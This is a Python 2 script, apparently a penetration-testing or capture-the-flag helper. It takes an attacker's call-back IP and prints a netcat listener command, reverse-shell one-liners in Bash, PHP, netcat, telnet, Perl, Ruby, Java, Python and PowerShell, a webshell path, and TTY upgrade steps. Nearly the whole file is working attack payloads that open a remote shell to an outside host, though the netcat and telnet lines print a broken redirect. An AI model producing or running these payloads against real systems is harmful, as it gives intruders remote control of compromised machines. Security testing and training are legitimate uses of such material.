#!/usr/bin/python
from os import system
from random import randint
ip=raw_input ("What is your call back IP? : ")
port=str(randint(32768, 65534))
class bcolors:
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

system('clear')
                                                                                            
print bcolors.WARNING + 'Local Listener:' + bcolors.ENDC
print 'nc -nvlp', (port)
print ('')
print ('')
print bcolors.WARNING + 'Remote Shell Callback Commands:' + bcolors.ENDC
print bcolors.OKGREEN + 'Bash:' + bcolors.ENDC
print 'bash -i >& /dev/tcp/'+(ip)+'/'+(port), '0>&1'
print ('')  
print bcolors.OKGREEN + 'PHP:' + bcolors.ENDC
print 'php -r \'$sock=fsockopen("'+(ip)+'",'+(port)+');exec("/bin/sh -i <&3 >&3 2>&3");\''
print ('')
print bcolors.OKGREEN + 'netcat:' + bcolors.ENDC
print 'rm -f /tmp/p; mknod /tmp/p p && nc',(ip), (port), '0/tmp/p'
print ('')
print bcolors.OKGREEN + 'telnet:' + bcolors.ENDC
print 'rm -f /tmp/p; mknod /tmp/p p && telnet', (ip), (port), '0/tmp/p'
print ('')
print bcolors.OKGREEN + 'perl:' + bcolors.ENDC
print 'perl -e \'use Socket;$i="'+(ip)+'";$p='+(port)+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
print ('')
print bcolors.OKGREEN + 'Ruby:' + bcolors.ENDC
print 'ruby -rsocket -e\'f=TCPSocket.open("'+(ip)+'",'+(port)+').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
print ('')
print bcolors.OKGREEN + 'Java:' + bcolors.ENDC
print 'r = Runtime.getRuntime()'
print 'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'+(ip)+'/'+(port)+';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
print 'p.waitFor()'
print ('')
print bcolors.OKGREEN + 'Python:' + bcolors.ENDC
print 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+(ip)+'",'+(port)+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
print ('')
print bcolors.OKGREEN + 'Powershell:' + bcolors.ENDC
print '$sm=(New-Object Net.Sockets.TCPClient("'+(ip)+'",'+(port)+')).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'
print ('')
print bcolors.WARNING + 'ls /usr/share/webshells/' + bcolors.ENDC
print ('')
print bcolors.WARNING + 'Shell Upgrade:' + bcolors.ENDC
print 'python -c \'import pty;pty.spawn("/bin/bash")\''
print 'Ctrl-z'
print 'stty raw -echo'
print 'fg'
print 'reset'
print ('')


